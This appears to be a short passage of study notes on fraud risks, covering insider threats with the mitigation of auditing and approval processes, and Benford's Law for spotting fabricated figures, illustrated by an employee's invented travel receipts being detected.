### Inside Job

People working in a company can become disgruntled or be bribed then damage a company.
Proper auditing and an approval process lower the likelihood of an `inside job` .

### Benford's Law

When dealing with house numbers or receipt amounts for a travel-reimbursement report,
human intuition suggests that the first digit of an entry should be equally '1' as for
the other digits '2' through '9' but mathematical analysis and real-world studies have shown
that '1' should appear around 30% of the time. If the occurrence of '1' doesn't appear
about that often, then it could indicate that the data are fraudulent.

  - Example - Chad submits a travel-expense report to a company with a very large total
  amount of money spent. Analyzing the first digit of each receipt shows that its value
  is '1' about 12 percent of the time. The accounting department challenges Chad about
  the submission and Chad admits to making the numbers up.
